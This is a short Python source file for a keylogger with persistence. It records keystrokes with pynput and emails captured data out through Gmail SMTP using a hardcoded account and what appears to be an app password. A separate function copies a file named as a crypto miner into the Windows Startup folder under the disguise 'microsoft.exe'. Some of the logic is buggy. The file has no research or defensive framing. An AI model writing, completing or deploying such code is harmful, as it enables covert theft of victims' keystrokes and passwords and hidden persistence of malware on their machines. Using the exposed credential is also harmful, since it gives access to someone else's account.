# keylogger with persistent
from pynput import keyboard
import pathlib
import smtplib
import os
import shutil
#1.fucntion for sending logged keys
def send_mail(gmail,data):
	server=smtplib.SMTP("smtp.gmail.com",587)
	server.starttls()
	server.login("leanghorngthelegend@gmail.com","ziys pquh jlbf aqst")
	server.sendmail(gmail,gmail,data)
	server.quit()
#2.function for recoding keys
def on_press(key):
	try:
		data="{0}".format(key.char)
	except:
		data="{0}".format(key)
	logged_keys.append(data)
	if data=="key.shift":
		send_mail("leanghorngthelegend@gmail.com",str(data))
	
#3.persistent 
def persistent():
	source=r"laptop_crypto_miner.exe"
	destination=r"..\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\microsoft.exe"
	shutil.move(source,destination)
	
#4.putting it all together
logged_keys=[]
try:
	with keyboard.Listener(on_press=on_press) as listener:
		listener.join()
except:
	print("\t ok bro you got it ")

























